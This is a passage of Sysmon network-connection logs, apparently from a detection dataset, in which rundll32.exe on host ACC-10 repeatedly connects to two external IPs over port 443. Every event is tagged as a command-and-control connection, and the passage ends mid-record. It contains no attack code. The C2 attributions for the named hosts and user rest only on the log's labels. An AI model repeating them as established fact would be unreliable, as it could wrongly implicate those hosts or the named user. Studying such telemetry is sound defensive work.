2022-08-05 22:41:29+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50327,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:41:29.978243900Z""/>     <EventRecordID>146484</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:41:23.798</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50327</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:41:31+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50328,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:41:31.978243900Z""/>     <EventRecordID>146485</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:41:24.305</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50328</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:42:11+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50338,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:42:11.991846500Z""/>     <EventRecordID>146652</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:42:06.165</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50338</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:42:13+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50339,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:42:13.262719400Z""/>     <EventRecordID>146655</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:42:06.631</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50339</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:42:51+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50380,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:42:51.084936800Z""/>     <EventRecordID>146748</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:42:45.109</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50380</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:42:51+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50381,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:42:51.084936800Z""/>     <EventRecordID>146749</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:42:45.188</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50381</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:43:37+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50388,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:43:37.324312400Z""/>     <EventRecordID>146818</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:43:31.722</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50388</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:43:39+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50389,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:43:39.074137400Z""/>     <EventRecordID>146823</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:43:31.929</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50389</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:44:31+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50394,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:44:31.184638200Z""/>     <EventRecordID>146977</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:44:24.800</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50394</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:44:34+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50401,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:44:34.953768600Z""/>     <EventRecordID>147012</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:44:29.551</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50401</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:45:30+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50539,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:45:30.043290500Z""/>     <EventRecordID>147489</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:45:24.629</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50539</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:45:41+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50586,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:45:41.931856000Z""/>     <EventRecordID>147643</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:45:35.023</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50586</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:46:19+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50649,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:46:19.687179200Z""/>     <EventRecordID>147864</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:46:14.269</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50649</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:46:19+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50650,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:46:19.941255400Z""/>     <EventRecordID>147867</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:46:14.409</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50650</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:47:02+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50759,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:47:02.904140400Z""/>     <EventRecordID>148144</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:46:57.316</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data 